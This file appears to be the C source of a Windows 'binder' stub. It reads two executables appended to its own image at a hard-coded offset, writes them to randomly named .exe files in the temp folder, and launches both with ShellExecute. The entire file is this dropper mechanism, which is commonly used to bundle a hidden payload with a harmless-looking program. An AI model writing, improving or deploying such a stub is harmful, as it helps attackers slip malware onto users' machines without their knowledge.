#include <windows.h>
#include <stdio.h>
char  *File1,*File2;
    FILE *pMe,*pFile1,*pFile2;
    long SizeMe=21814L,SizeFile1,SizeFile2,c;
    char *Me;
    int i=0;
    
    

char *GetName()
{
    char *Path=(char*)malloc(MAX_PATH),*Name=(char*)malloc(MAX_PATH);
    memset(Path,0,MAX_PATH); 
    memset(Name,0,MAX_PATH);
    GetTempPath(MAX_PATH,Path);
    GetTempFileName(Path,"CM",0,Name);
    strcat(Name,".exe");

    return Name;
    
}


int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument,int nFunsterStil)
{
    char *Buffer;
    Me=(char*)malloc(MAX_PATH);
    GetModuleFileName(0,Me,MAX_PATH);
    
    File1=GetName();
    File2=GetName();
   
    pFile1=fopen(File1,"wb");
    pFile2=fopen(File2,"wb");
    pMe=fopen(Me,"rb");
    
    //Lee el tamaño de los archivos
    fseek(pMe,SizeMe+10,SEEK_SET);
    
   	//Leyendo tamaño del primer archivo
	fread(&SizeFile1,sizeof(SizeFile1),1,pMe);
	
	//Leyendo tamaño del segundo archivo
	fread(&SizeFile2,sizeof(SizeFile2),1,pMe);
	
	//Leyendo archivo 1
	Buffer=(char*)malloc(SizeFile1+100);
	memset(Buffer,0,SizeFile1+100);
    fread(Buffer,SizeFile1,1,pMe);
    fwrite(Buffer,1,SizeFile1,pFile1);
        
    //Leyendo archivo 2
	Buffer=(char*)malloc(SizeFile2+100);
	memset(Buffer,0,SizeFile2+100);
    fread(Buffer,SizeFile2,1,pMe);
    fwrite(Buffer,1,SizeFile2,pFile2);

    fclose(pMe);
    fclose(pFile1);
    fclose(pFile2);
    
    //Ejecutamos los archivos
    ShellExecute(NULL,"open",File1,0,"",SW_SHOW);
    ShellExecute(NULL,"open",File2,0,"",SW_SHOW);
    
}







